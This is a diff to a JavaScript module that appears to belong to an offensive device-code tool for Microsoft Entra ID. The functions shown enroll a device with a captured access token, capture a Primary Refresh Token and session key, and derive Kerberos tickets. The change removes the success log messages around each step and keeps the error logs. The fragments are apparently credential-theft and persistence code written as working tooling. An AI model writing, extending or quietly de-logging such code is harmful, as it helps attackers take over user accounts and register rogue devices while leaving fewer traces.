@@ -216,8 +216,6 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
     },
   };
 
-  console.log('[devicecode] DRS enrollment starting');
-
   const drsHeaders = {
     Authorization: `Bearer ${accessToken}`,
     'Content-Type': 'application/json',
@@ -261,7 +259,6 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
   }
 
   const data = response.data;
-  console.log('[devicecode] DRS enrollment response received');
 
   // GraphSpy device.register():
   //     certificate_base64 = response_json["Certificate"]["RawBody"]
@@ -534,8 +531,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 certificateForPrt = certificateDerBase64 || null;
                 deviceCertPemForPrt = deviceCertificate || null;
                 deviceId = enrollmentResult.deviceId || deviceId;
-
-                console.log(`[devicecode] Device enrolled: ${enrollmentResult.deviceName} (${deviceId})`);
             } catch (enrollErr) {
                 console.error('[devicecode] Device enrollment failed:', enrollErr.message);
                 deviceEnrolled = false;
@@ -567,7 +562,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 rawPrt = prtResult.prt;
                 sessionKeyHex = prtResult.sessionKeyHex;
                 if (prtResult.sessionKeyJwe) deviceSessionKeyJwe = prtResult.sessionKeyJwe;
-                console.log('[devicecode] PRT captured via request_for_device (GraphSpy parity)');
 
                 // Persist the decrypted session key where
                 // resolveSessionKeyForToken()/getStoredSessionKey() read it -
@@ -676,10 +670,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
             && tenant && tenant !== 'common' && tenant !== 'organizations') {
             const kerberosService = require('./kerberos');
             kerberosService.deriveTGTForToken(tokenId)
-                .then(r => {
-                    if (r && r.success) console.log('[devicecode] Kerberos TGTs derived for token', tokenId);
-                    else console.log('[devicecode] Kerberos derivation skipped for token', tokenId, ':', (r && r.error) || 'unknown');
-                })
                 .catch(err => console.error('[devicecode] Kerberos derivation error:', err.message));
         }
 
